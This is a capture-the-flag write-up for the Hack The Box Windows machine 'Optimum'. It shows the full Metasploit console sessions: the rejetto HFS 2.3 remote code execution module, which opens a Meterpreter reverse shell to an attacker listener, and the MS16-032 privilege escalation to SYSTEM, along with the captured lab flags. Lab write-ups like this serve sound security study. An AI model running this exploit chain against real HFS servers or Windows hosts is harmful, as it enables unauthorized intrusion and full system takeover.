# Optimum-HTB
Optimum is a Windows machine that is rated as easy. This box is one of the best for beginners, so let's start :)

# Recon
I started by runing nmap scan on the box.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.8       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-30 22:16 EDT
Nmap scan report for 10.10.10.8
Host is up (0.034s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
```
After some searching I was able to get a Metasploit exploitation.

# User Flag
This is the exploit module: ```exploit/windows/http/rejetto_hfs_exec```
```
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > options 

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
Let's run it now:
```
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Using URL: http://0.0.0.0:8080/RueCabqdIH
[*] Local IP: http://192.168.67.142:8080/RueCabqdIH
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /RueCabqdIH
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.8:49162) at 2020-08-30 22:26:14 -0400
[!] Tried to delete %TEMP%\ZlyHLmptruG.vbs, unknown result
[*] Server stopped.

meterpreter > getuid 
Server username: OPTIMUM\kostas
```
User Flag:
```
meterpreter > shell 
Process 2604 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>type user.txt.txt
type user.txt.txt
d0c39409d...f38ef5f73
```

# Root Flag
So after long search and tring of local exploitation, I was able to get a shell as system using this module: ```exploit/windows/local/ms16_032_secondary_logon_handle_privesc```

Here it is:
```
msf5 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options 

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86
```
Let's run it now:
```
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:5555 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\cYOZuIHQ.ps1...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2092

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2072
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

ckCyAmFT3qJlA9D4ji0PEFC3TxzkBskA
[+] Executed on target machine.
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.28:5555 -> 10.10.10.8:49163) at 2020-08-30 22:36:39 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\cYOZuIHQ.ps1

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

Get Root Flag:
```
meterpreter > shell 
Process 976 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>type root.txt
type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
